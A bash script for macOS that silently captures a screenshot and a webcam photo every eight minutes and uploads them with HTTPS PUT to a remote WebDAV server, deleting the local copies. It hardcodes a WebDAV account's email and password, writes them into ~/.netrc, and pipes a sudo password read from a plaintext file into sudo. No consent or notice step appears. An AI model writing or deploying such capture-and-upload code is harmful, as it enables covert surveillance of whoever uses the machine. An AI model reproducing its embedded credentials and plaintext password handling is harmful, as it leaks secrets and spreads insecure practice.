#!/usr/bin/env bash

# Load sudo password from file
PFILE="$HOME/programfiles/p.txt"
if [ ! -f "$PFILE" ]; then
  echo "❌ Password file not found at '$PFILE'. Required for installing imagesnap."
  exit 1
fi
SUDO_PASS=$(<"$PFILE")

# Ensure image directory exists
IMG_DIR="$HOME/programfiles/images"
mkdir -p "$IMG_DIR"

# WebDAV server configuration
WEBDAV_URL="https://drive.genshinimpact.ca/dav"
WEBDAV_USER="thomas@tjokas.com"
WEBDAV_PASS="0Ytbzu7M1jOMjt0ioNljvr01xHD85SXR"

# Export WebDAV credentials for Python uploader
export WEBDAV_URL WEBDAV_USER WEBDAV_PASS

# Ensure .netrc has WebDAV credentials for curl
NETRC="$HOME/.netrc"
HOST="${WEBDAV_URL#https://}"
if ! grep -q "machine $HOST" "$NETRC" 2>/dev/null; then
  cat > "$NETRC" <<EOF
machine $HOST
login $WEBDAV_USER
password $WEBDAV_PASS
EOF
  chmod 600 "$NETRC"
fi

# Function: upload any pending images via Python HTTPS PUT
upload_pending() {
  echo "[*] Uploading pending images via Python..."
  for f in "$IMG_DIR"/*.png; do
    [ -e "$f" ] || continue
    python3 - "$f" <<'PYCODE'
import sys, os, base64, urllib.request, urllib.error
file = sys.argv[1]
url = os.environ['WEBDAV_URL'].rstrip('/') + '/' + os.path.basename(file)
user = os.environ['WEBDAV_USER']
pw   = os.environ['WEBDAV_PASS']
data = open(file, 'rb').read()
req = urllib.request.Request(url, data=data, method='PUT')
auth = base64.b64encode(f"{user}:{pw}".encode()).decode()
req.add_header("Authorization", f"Basic {auth}")
try:
    urllib.request.urlopen(req, timeout=60)
    sys.exit(0)
except urllib.error.HTTPError as e:
    print(f"HTTP Error: {e.code} {e.reason}", file=sys.stderr)
    sys.exit(1)
except Exception as e:
    print(f"Error: {e}", file=sys.stderr)
    sys.exit(1)
PYCODE
    if [ $? -eq 0 ]; then
      echo "[*] Uploaded and removed $f"
      rm -f "$f"
    else
      echo "❌ Failed to upload $f; will retry later."
    fi
  done
}

# Infinite loop: capture every 8 minutes
while true; do
  # Attempt to upload any previously captured images
  upload_pending

  timestamp=$(date +"%Y-%m-%d-at-%H-%M")

  # Capture screen
  screencapture "$IMG_DIR/${timestamp}-screen.png"
  # Ensure imagesnap is installed
  if ! command -v imagesnap &> /dev/null; then
    echo "[*] imagesnap not found; installing via Homebrew..."
    echo "$SUDO_PASS" | sudo -S brew install imagesnap
  fi
  # Capture webcam image (skip on failure)
  if ! imagesnap -q "$IMG_DIR/${timestamp}-cam.png"; then
    echo "❌ Webcam capture failed; skipping."
  fi
  # Try uploading all pending images again (including just-captured)
  upload_pending

  # Wait for 8 minutes (480 seconds)
  sleep $((8 * 60))
done